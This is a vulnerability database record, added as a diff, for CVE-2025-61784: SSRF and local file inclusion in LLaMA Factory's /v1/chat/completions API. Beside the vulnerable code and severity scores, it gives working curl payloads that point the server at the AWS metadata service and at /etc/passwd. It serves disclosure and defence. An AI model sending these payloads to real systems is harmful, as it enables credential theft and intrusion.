@@ -1,0 +1,277 @@
+vulnerability_id: VCID-rsq8-h6qx-mka8
+aliases:
+  - CVE-2025-61784
+  - GHSA-527m-2xhr-j27g
+summary: |
+  LLaMA Factory's Chat API Contains Critical SSRF and LFI Vulnerabilities
+  ## Summary ##
+
+  A Server-Side Request Forgery (SSRF) vulnerability in the chat API allows any authenticated user to force the server to make arbitrary HTTP requests to internal and external networks. This can lead to the exposure of sensitive internal services, reconnaissance of the internal network, or interaction with third-party services. The same mechanism also allows for a Local File Inclusion (LFI) vulnerability, enabling users to read arbitrary files from the server's filesystem.
+
+  ## Details ##
+
+  The vulnerability exists in the _process_request function within src/llamafactory/api/chat.py. This function is responsible for processing incoming multimodal content, including images, videos, and audio provided via URLs.
+
+  The function checks if the provided URL is a base64 data URI or a local file path (os.path.isfile). If neither is true, it falls back to treating the URL as a web URI and makes a direct HTTP GET request using requests.get(url, stream=True).raw without any validation or sanitization of the URL.
+
+  Vulnerable Code Snippets in _process_request:
+  ```
+  # ...
+          elif input_item.type == "image_url":
+              # ...
+              else:  # web uri
+                  image_stream = requests.get(image_url, stream=True).raw
+  # ...
+          elif input_item.type == "video_url":
+              # ...
+              else:  # web uri
+                  video_stream = requests.get(video_url, stream=True).raw
+  # ...
+          elif input_item.type == "audio_url":
+              # ...
+              else:  # web uri
+                  audio_stream = requests.get(audio_url, stream=True).raw
+  # ...
+  ```
+  This vulnerable function is called by create_chat_completion_response and create_stream_chat_completion_response, which are in turn called by the public-facing /v1/chat/completions API endpoint in src/llamafactory/api/app.py. A user can craft a request to this endpoint containing a malicious URL in the messages payload to trigger the vulnerability.
+
+  ## PoC ##
+
+  To reproduce the vulnerability, send a POST request to the /v1/chat/completions endpoint with a JSON payload containing a URL that points to an internal or controlled external service. Start the LLaMA Factory API server. Use curl to send the malicious request. The following example uses a URL pointing to the AWS metadata service, a common SSRF attack vector.
+
+  SSRF Payload:
+  ```
+  curl -X POST "http://127.0.0.1:8000/v1/chat/completions" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer your_api_key" \
+  -d '{
+    "model": "your-model-name",
+    "messages": [
+      {
+        "role": "user",
+        "content": [
+          {
+            "type": "text",
+            "text": "What is in this image?"
+          },
+          {
+            "type": "image_url",
+            "image_url": {
+              "url": "http://169.254.169.254/latest/meta-data/"
+            }
+          }
+        ]
+      }
+    ]
+  }'
+  ```
+  LFI Payload:
+  ```
+  curl -X POST "http://127.0.0.1:8000/v1/chat/completions" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer your_api_key" \
+  -d '{
+    "model": "your-model-name",
+    "messages": [
+      {
+        "role": "user",
+        "content": [
+          {
+            "type": "text",
+            "text": "What is in this image?"
+          },
+          {
+            "type": "image_url",
+            "image_url": {
+              "url": "/etc/passwd"
+            }
+          }
+        ]
+      }
+    ]
+  }'
+  ```
+  The server will make a request to the specified URL or read the specified local file.
+
+  ## Impact ##
+
+  **Vulnerability Type**: Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI).
+
+  **Impacted Component**: The API server, specifically the /v1/chat/completions endpoint.
+
+  **Who is impacted**: Any user who can send requests to the chat API. The vulnerability allows an attacker to bypass firewalls and access internal network resources, query cloud metadata services for credentials, or read sensitive files on the server. The severity is critical.
+severities:
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10816'
+    published_at: '2025-10-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10727'
+    published_at: '2025-10-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10738'
+    published_at: '2025-10-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10753'
+    published_at: '2025-10-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10803'
+    published_at: '2025-11-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10845'
+    published_at: '2025-11-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10728'
+    published_at: '2025-10-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10709'
+    published_at: '2025-10-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.0005'
+    scoring_system: epss
+    scoring_elements: '0.15955'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.0005'
+    scoring_system: epss
+    scoring_elements: '0.15979'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16386'
+    published_at: '2025-10-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00059'
+    scoring_system: epss
+    scoring_elements: '0.18704'
+    published_at: '2025-10-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00059'
+    scoring_system: epss
+    scoring_elements: '0.18626'
+    published_at: '2025-10-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00059'
+    scoring_system: epss
+    scoring_elements: '0.18695'
+    published_at: '2025-10-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00059'
+    scoring_system: epss
+    scoring_elements: '0.18668'
+    published_at: '2025-10-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00059'
+    scoring_system: epss
+    scoring_elements: '0.18657'
+    published_at: '2025-10-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00059'
+    scoring_system: epss
+    scoring_elements: '0.18631'
+    published_at: '2025-10-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: '0.00059'
+    scoring_system: epss
+    scoring_elements: '0.18578'
+    published_at: '2025-10-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-527m-2xhr-j27g
+  - score: '7.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
+    published_at: None
+    url: https://github.com/hiyouga/LLaMA-Factory
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/hiyouga/LLaMA-Factory
+  - score: '7.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
+    published_at: None
+    url: https://github.com/hiyouga/LLaMA-Factory/commit/95b7188090a1018935c9dc072bfc97f24f1c96e9
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/hiyouga/LLaMA-Factory/commit/95b7188090a1018935c9dc072bfc97f24f1c96e9
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-07T19:24:17Z/
+    published_at: None
+    url: https://github.com/hiyouga/LLaMA-Factory/commit/95b7188090a1018935c9dc072bfc97f24f1c96e9
+  - score: '7.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
+    published_at: None
+    url: https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-527m-2xhr-j27g
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-527m-2xhr-j27g
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-527m-2xhr-j27g
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-07T19:24:17Z/
+    published_at: None
+    url: https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-527m-2xhr-j27g
+  - score: '7.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-61784
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-61784
+weaknesses:
+  - CWE-22
+  - CWE-1035
+  - CWE-937
+  - CWE-918
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-61784
+    reference_type:
+    reference_id:
+  - url: https://github.com/hiyouga/LLaMA-Factory
+    reference_type:
+    reference_id:
+  - url: https://github.com/hiyouga/LLaMA-Factory/commit/95b7188090a1018935c9dc072bfc97f24f1c96e9
+    reference_type:
+    reference_id:
+  - url: https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-527m-2xhr-j27g
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-61784
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-527m-2xhr-j27g
+    reference_type:
+    reference_id: GHSA-527m-2xhr-j27g
